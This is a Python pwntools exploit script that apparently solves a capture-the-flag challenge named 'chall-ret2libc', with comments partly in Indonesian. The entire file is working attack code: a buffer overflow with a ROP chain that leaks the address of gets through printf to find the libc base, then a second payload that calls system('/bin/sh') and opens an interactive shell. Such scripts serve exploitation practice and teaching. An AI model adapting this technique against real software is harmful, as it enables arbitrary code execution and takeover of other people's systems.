#!/usr/bin/env python3

from pwn import *

exe = "chall-ret2libc"
libc = ELF("libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

elf = context.binary = ELF(exe)
p = process(exe)

main = p64(0x000000000040117a)
ret = p64(0x000000000040101a)

#0x0000000000401233 : pop rdi ; ret
pop_rdi = p64(0x0000000000401233)

#### Leak geming
payload = b"a"*9
payload += ret
payload += pop_rdi
payload += p64(elf.sym['got.gets'])
payload += p64(elf.sym['plt.printf'])
payload += ret
payload += p64(elf.sym['main'])

p.recv()
p.sendline(payload)

leak = u64(p.recvuntil(b"well").strip().replace(b"well",b"").ljust(8,b'\0'))
#gef➤  x/s 0x7fb37b03d000
#0x7fb37b03d000: "\177ELF\002\001\001\003"

print(hex(leak)) #address gets ini ngap
libc.address = leak - libc.sym['gets']


bin_sh = p64(next(libc.search(b'/bin/sh')))
system = p64(libc.symbols.system)

payload = b"a"*9
payload += ret
payload += pop_rdi
payload += bin_sh
payload += system


p.recv()
p.sendline(payload)
p.interactive()
print(hex(libc.address))
#pause()

#p.interactive()

